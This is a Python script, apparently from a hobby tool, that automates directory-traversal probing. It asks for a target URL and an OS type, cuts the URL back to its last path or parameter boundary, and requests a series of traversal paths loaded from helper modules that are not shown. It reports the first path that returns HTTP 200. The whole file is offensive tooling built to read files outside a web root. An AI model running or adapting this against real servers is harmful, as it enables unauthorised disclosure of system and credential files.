import requests
from colorama import Fore
from welcome import *
from sn4k import paths_fn
from sn4k import p
from function import search_file 
from function import file_linux,file_windows
    
afficher_serpent()
afficher_message_bienvenue()

url_0 = str(input('Copy the URL here  ---> : '))
os_type = str(input("Choose the type of the file, Windows or Linux --> W/L :  "))


file_type_linux = file_linux()
file_type_windows = file_windows()
p = search_file(os_type,file_type_windows,file_type_linux)
afficher_ciseaux()
afficher_message_ciseau()

#Shear the URL to work on the new cut link
n = -1
while url_0[n] != '/' and url_0[n] != '=':
        url_0[n-1]
        n = n-1
        url_coupe = url_0[:n+1]

#Sheared URL   
url_coupe = url_0[:n+1]
print(url_coupe)
#We are now testing the various path traversals
good_url=[]
liste_path = paths_fn(p)

for i,liste in enumerate(liste_path):
        path = url_coupe + liste
        print("Tentative : ",i+1, " path used : ", liste)
        print(path)
        if requests.get(path).status_code == 200:
            good_url.append(path)
            break   
    
#displays responses
message3()
for i,url_ in enumerate(good_url):
       
        print(Fore.RED + f"{url_}")
